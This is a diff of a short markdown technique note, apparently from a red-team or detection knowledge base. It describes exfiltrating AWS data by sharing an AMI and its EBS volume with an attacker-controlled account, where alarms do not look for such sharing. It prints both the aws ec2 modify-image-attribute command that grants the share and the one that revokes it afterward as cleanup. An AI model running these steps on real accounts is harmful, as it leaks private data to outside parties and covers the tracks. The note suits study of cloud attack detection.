@@ -34,9 +34,13 @@ Alarms that watch for EC2 instances being deployed, but don't look for AMI Image
 
 [AWS Share AMI Image Doc](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/sharingamis-explicit.html)
 
+
+
 ##  Instructions
 
 1. Share the AMI ID with a user in the attacker AWS account. This automatically includes the EBS volume for launch
+
+
 
 **Command** ([[aws ec2 share AMI ID with another user account]]):
 
@@ -45,9 +49,17 @@ aws ec2 modify-image-attribute --image-id $AWS_AMI_ID --launch-permission "Add=$
 
 ```
 
+
+
+
+
+
+
 2. Remove the share permission. Do this when you want to clean up and revoke the share.
 
 Do this after you deployed the AMI on the attacker account
+
+
 
 **Command** ([[aws ec2 remove shared AMI ID access]]):
 
@@ -55,6 +67,12 @@ Do this after you deployed the AMI on the attacker account
 aws ec2 modify-image-attribute --image-id $AWS_AMI_ID --launch-permission "Remove=$IAM_USER_ID"
 
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -69,3 +87,5 @@ aws ec2 modify-image-attribute --image-id $AWS_AMI_ID --launch-permission "Remov
 
 - [[AWS]]
 - [[Cloud]]
+
+
